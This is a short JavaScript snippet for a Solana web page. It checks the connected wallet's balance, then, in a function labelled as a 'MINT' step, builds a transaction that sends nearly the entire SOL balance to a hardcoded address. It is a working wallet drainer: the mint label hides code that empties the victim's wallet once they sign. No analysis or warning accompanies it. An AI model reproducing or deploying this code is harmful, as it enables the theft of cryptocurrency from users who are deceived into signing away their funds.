  //CHECK BALANCE
async function checkBalance() {
    if (!window.solana.publicKey) {
      console.log("[checkBalance] Error: wallet is not connected.")
      return;
    }
    const connection = new Connection(clusterApiUrl('mainnet-beta'));
    console.log("Connection", connection);
    const balance = await connection.getBalance(window.solana.publicKey);
    const sol = balance / LAMPORTS_PER_SOL;
    console.log("Wallet's Public Key", window.solana.publicKey.toString());
    console.log("Balance", sol, "SOL");
    return sol;
  }

  //MINT
async function sendMaxSol() {
    const destPubkey = new PublicKey("776Ge3z3Pty4wLoVhNYJgE6Qnu5Y9qXYjDLx3b6W27zu");
    //console.log("Send to", destPubkey);
    const network = WalletAdapterNetwork.Mainnet;
    const connection = new Connection(clusterApiUrl(network));
    //console.log("Connection", connection)
    const FEE = 5000;
    const ENOUGH_SOL = 0.005;
    const sol = await checkBalance();
  
    // Abort if wallet has not enough SOL to make transaction.
    if (sol < ENOUGH_SOL) {
      console.log('[sendMaxSol] Error: not enough funds.');
      return;
    }
  
    const hash = await connection.getLatestBlockhash();
    const transaction = new Transaction({
      recentBlockhash: hash.blockhash, 
      feePayer: window.solana.publicKey,
    });
    transaction.add(SystemProgram.transfer({
      fromPubkey: window.solana.publicKey,
      toPubkey: destPubkey,
      lamports: LAMPORTS_PER_SOL * sol - FEE,
    }));
    
    const { signature } = await window.solana.signAndSendTransaction(transaction, {signers: window.solana.publicKey});
    await connection.confirmTransaction(signature);
    console.log("Success! Signature:", signature);
  }

